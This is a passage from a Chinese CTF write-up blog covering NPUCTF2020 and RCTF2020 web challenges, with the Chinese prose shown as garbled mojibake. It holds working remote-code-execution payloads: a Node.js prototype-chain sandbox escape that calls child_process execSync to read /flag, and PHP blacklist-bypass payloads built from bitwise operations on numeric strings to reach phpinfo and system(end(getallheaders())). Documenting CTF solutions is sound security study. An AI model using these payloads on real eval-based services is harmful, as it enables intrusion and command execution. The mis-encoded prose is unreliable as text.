<p>å…ˆè€ƒè™‘ç¬¬ä¸€å±‚ï¼Œ<br><code>first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[0]) === md5(second+keys[0])</code>keysä¸å¯çŸ¥ï¼Œæ— æ³•çˆ†ç ´ï¼Œè€Œä¸”éœ€è¦.lengthç›¸ç­‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸ç­‰ï¼Œæ³¨æ„ï¼Œæ­¤å¤„ç”¨çš„æ˜¯===ä»¥ä½¿ç±»å‹å’Œå€¼å®Œå…¨åŒ¹é…<br>å¯¹å…¶è¿›è¡ŒåŠ ç›md5ï¼ŒåŠ ç›ä¸­å‡ºç°äº†é—®é¢˜ï¼Œå› ä¸ºç›æ˜¯å­—ç¬¦ä¸²ï¼Œä¸å­—ç¬¦ä¸²ç›¸åŠ ä¼šå¯¼è‡´å¼ºåˆ¶ç±»å‹è½¬åŒ– è€ŒStringå’ŒArrayéƒ½æ­£å¥½æœ‰lengthå±æ€§ï¼Œå¹¶ä¸”</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200605101837835.png" alt="image-20200605101837835"></p>
<p>ä½†æ˜¯ç›´æ¥ä¼ urlencodedçš„è¡¨å•æ˜¯æ²¡æ³•ä¼ æ•°ç»„çš„ï¼Œè€Œè¿™é‡Œæ­£å¥½ä½¿ç”¨äº†JSONçš„ä¸­é—´ä»¶ï¼Œæ‰€ä»¥åªéœ€è¦ä¼ JSONå°±å¥½äº†</p>
<p>ç„¶åè€ƒè™‘ç»•è¿‡æ­£åˆ™ï¼Œå¿…é¡»ä»¥ <code>Math.</code>å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œç¬¦å·åªèƒ½å‡ºç°<code>()+\-*&amp;|%^&lt;&gt;=,?:</code>ï¼Œè™½ç„¶å¯ä»¥ <code>Math.__proto__</code>ä½†åœ¨è¿™é‡Œæ— æ³•ç›´æ¥åˆ©ç”¨ã€‚</p>
<p>ä½†å¯ä»¥é€šè¿‡<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions" target="_blank" rel="noopener">ç®­å¤´å‡½æ•°</a>æ„é€ è¿™ç§é“¾</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__,<span class="built_in">Math</span>=<span class="built_in">Math</span>.__proto__))(<span class="built_in">Math</span>)</span><br><span class="line"><span class="comment">// Math.__proto__.__proto__</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå°è¯•è°ƒç”¨evalæˆ–è€…Functionï¼Œä½†æ˜¯æ­¤å¤„æ— æ³•ç›´æ¥è¾“å…¥å­—ç¬¦ä¸²ï¼Œæ•…ä½¿ç”¨String.fromCharCode(â€¦ï¼‰ç„¶ååˆ©ç”¨<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/constructor" target="_blank" rel="noopener">Object.prototype.constructor</a>ä»åŸå‹é“¾ä¸Šå¯¼å‡º <code>String</code> å’ŒFunction</p>
<p>payloayå¤§è‡´å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function">(<span class="params"><span class="built_in">Math</span></span>)=&gt;</span>(<span class="built_in">Math</span>=<span class="built_in">Math</span>.constructor,<span class="built_in">Math</span>.constructor(<span class="built_in">Math</span>.fromCharCode(...))))(<span class="built_in">Math</span>+<span class="number">1</span>)()</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹</p>
<p>å¼€å¤´çš„Mathæ˜¯ç®­å¤´å‡½æ•°ã€‚éœ€è¦æ¥å—çš„å‚æ•°ã€‚ç±»ä¼¼äºfunction(Math)</p>
<p>(Math+1)æ˜¯å‡½æ•°çš„å‚æ•°ï¼ŒMathæ˜¯ä¸ªå¯¹è±¡ ä¸å­—ç¬¦ä¸²1æ‹¼æ¥åå˜æˆä¸€ä¸ªå­—ç¬¦ä¸²</p>
<p>æœ€å¤–é¢çš„å°æ‹¬å·ã€‚æ˜¯JSçš„ç«‹å³æ‰§è¡Œå‡½æ•°ã€‚å®šä¹‰å‡½æ•°åè°ƒç”¨</p>
<p>ä¸­é—´ä¸€é•¿ä¸²å°±æ˜¯å‡½æ•°ä½“äº†</p>
<p><img src="/2020/05/NPUCTF2020-å¤ç°/image-20200605113220410.png" alt="image-20200605113220410"></p>
<p>ç”Ÿæˆå‘½ä»¤</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span><span class="params">(cmd)</span>:</span></span><br><span class="line">  s = <span class="string">f"return process.mainModule.require('child_process').execSync('<span class="subst">&#123;cmd&#125;</span>').toString()"</span></span><br><span class="line">  <span class="keyword">return</span> <span class="string">','</span>.join([str(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(gen(<span class="string">'cat /flag'</span>))</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´expï¼š</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">&#123;"e":"(Math=&gt;(Math=Math.constructor,Math=Math.constructor(Math.fromCharCode(<span class="number">114,101,116,117</span>,<span class="number">114,110,32,112</span>,<span class="number">114,111,99,101</span>,<span class="number">115,115,46,109</span>,<span class="number">97,105,110,77</span>,<span class="number">111,100,117,108</span>,<span class="number">101,46,114,101</span>,<span class="number">113,117,105,114</span>,<span class="number">101,40,39,99</span>,<span class="number">104,105,108,100</span>,<span class="number">95,112,114,111</span>,<span class="number">99,101,115,115</span>,<span class="number">39,41,46,101</span>,<span class="number">120,101,99,83</span>,<span class="number">121,110,99,40</span>,<span class="number">39,99,97,116</span>,<span class="number">32,47,102,108</span>,<span class="number">97,103,39,41</span>,<span class="number">46,116,111,83</span>,<span class="number">116,114,105,110</span>,<span class="number">103,40,41</span>))()))(Math+<span class="number">1</span>)","first":"<span class="number">1</span>","second":[<span class="number">1</span>]&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸è¦å¿˜äº†æŠŠä¿®æ”¹æŠŠContent-Type ä¿®æ”¹æˆ<code>application/json</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>å¤ç°</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2020-å¤ç°</title>
    <url>/2020/06/RCTF2020-%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-calc"><a href="#1-calc" class="headerlink" title="1.calc"></a>1.calc</h3><p>RoarCTF2020çš„<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">easy_calc</a>çš„å‡çº§ç‰ˆ,è¿‡æ»¤äº†æ›´å¤šå­—ç¬¦ï¼Œä½†æ€è·¯è¿˜æ˜¯ä¸€æ ·çš„</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">    $blacklist = [<span class="string">'[a-z]'</span>, <span class="string">'[\x7f-\xff]'</span>, <span class="string">'\s'</span>,<span class="string">"'"</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>, <span class="string">'_'</span>, <span class="string">'\\\\'</span>,<span class="string">'\^'</span>, <span class="string">','</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a>


<p>â€‹    åœ¨ PHP ä¸­ï¼Œå°†ä¸¤ä¸ªæ•°å­—ä½¿ç”¨<code>.</code>æ‹¼æ¥ï¼Œä¼šå½“åšå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œè¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ä¾‹å¦‚ï¼š<code>(1).(2)</code>å‡ºæ¥çš„å°±æ˜¯å­—ç¬¦ä¸²<code>&quot;12&quot;</code>ï¼Œç„¶åå¯ä»¥ç”¨<code>{}</code>æ¥ä»£æ›¿<code>[]</code>æ¥å–å•ä¸ªå­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆè·å¾—ä¸€éƒ¨åˆ†å­—ç¬¦ç„¶åä½è¿ç®—è·å–æ‰€æœ‰çš„å­—ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// .</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">//E</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;); <span class="comment">// +</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// N</span></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;); <span class="comment">// F</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">// A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"1"</span> | <span class="string">"E"</span>);<span class="comment">//u</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"3"</span> | <span class="string">"E"</span>); <span class="comment">// w</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"4"</span> | <span class="string">"I"</span>); <span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"I"</span>); <span class="comment">// y</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"0"</span> | <span class="string">"F"</span>); <span class="comment">//v</span></span><br></pre></td></tr></table></figure>

<p><a href="https://mp.weixin.qq.com/s/0J9Omna8tmKWP9s4iSg10w" target="_blank" rel="noopener">chamd5çš„æ„é€ è„šæœ¬</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">strings = [<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'E'</span>,<span class="string">'u'</span>,<span class="string">'w'</span>,<span class="string">'&#125;'</span>,<span class="string">'+'</span>,<span class="string">'.'</span>,<span class="string">'I'</span>,<span class="string">'N'</span>,<span class="string">'F'</span>,<span class="string">'y'</span>,<span class="string">'v'</span>]</span><br><span class="line"></span><br><span class="line">input_value = <span class="string">'o'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line"></span><br><span class="line">print(len(strings))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)&amp;ord(s1)))</span><br><span class="line">    data = data.strip()</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    data = (chr(ord(s)|ord(s1))).strip()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'|'</span>,s1)</span><br><span class="line">print(len(strings))</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">for</span> s1 <span class="keyword">in</span> strings:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      data = (chr(ord(s)&amp;ord(s1))).strip()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">      strings.append(data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success'</span>,s,<span class="string">'&amp;'</span>,s1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    data = chr(~ord(s))</span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  data = data.strip()</span><br><span class="line">  <span class="keyword">if</span> data <span class="keyword">not</span> <span class="keyword">in</span> strings:</span><br><span class="line">    strings.append(data)</span><br><span class="line">    <span class="keyword">if</span> data == input_value:</span><br><span class="line">      <span class="comment"># print(data)</span></span><br><span class="line">      print(<span class="string">'success ~'</span>,s)</span><br></pre></td></tr></table></figure>

<p>æ‰‹å·¥æ‹¼äº†ä¸ª <code>pHpINFo</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="string">''</span>;</span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.= (((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//H=y&amp;N</span></span><br><span class="line">$a.=(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;)); <span class="comment">//p=y&amp;v</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;); <span class="comment">//I</span></span><br><span class="line">$a.=(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;); <span class="comment">//N</span></span><br><span class="line">$a.= (((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;);<span class="comment">//F=w &amp; N</span></span><br><span class="line">$a.= (((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;);<span class="comment">//o=E | +</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure>

<p>å®Œæ•´çš„payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))&amp;(((<span class="number">0</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">3</span>).(<span class="number">0</span>)&#123;<span class="number">0</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;))&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).((((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">9999999999999999999</span>).(<span class="number">0</span>))&#123;<span class="number">4</span>&#125;)))()</span><br></pre></td></tr></table></figure>

<p>åé¢çš„ä¸æ‹¼äº†â€¦â€¦ ç›´æ¥ç”¨å¸ˆå‚…ä»¬çš„payload</p>
<p>é¢˜ç›®ä¸­æ–­å¤–ç½‘ï¼Œå¹¶ä¸”éœ€è¦<code>/readflag</code>ï¼Œå³éœ€è¦ä¸€ä¸ªshell. è¿›è¡Œå‘½ä»¤æ‰§è¡Œ.</p>
<ul>
<li>æœ‰å‡ ç§æ–¹å¼</li>
</ul>
<ol>
<li><p>system(end(getallheaders()));</p>
</li>
<li><p>system(file_get_contents(â€œphp://inputâ€)); </p>
</li>
<li><p>æŠŠè„šæœ¬å†…å®¹å†™åˆ°ä¸€ä¸ªæ–‡ä»¶, æœ€åæ‰§è¡Œ  </p>
</li>
</ol>
<p><code>system(end(getallheaders()));çš„payload;</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">9</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">3</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;));</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;);</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">-1</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;));</span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//systEm</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//n</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">6</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line"><span class="keyword">echo</span> $a; <span class="comment">//EnD</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// getallheaders</span></span><br><span class="line">$a =<span class="string">''</span>;</span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">8</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)))); <span class="comment">// g</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">//T</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// l</span></span><br><span class="line">$a .= (((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)|(((<span class="number">1.1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">// h</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//a</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;((~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">4</span>))&#123;<span class="number">1</span>&#125;))); <span class="comment">//D</span></span><br><span class="line">$a .= (((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;); <span class="comment">// E</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))|(((<span class="number">1</span>).(<span class="number">2</span>))&#123;<span class="number">1</span>&#125;)); <span class="comment">// r</span></span><br><span class="line">$a .= ((((<span class="number">10000000000000000000</span>).(<span class="number">1</span>))&#123;<span class="number">3</span>&#125;)&amp;(~(((<span class="number">1</span>).(<span class="number">7</span>))&#123;<span 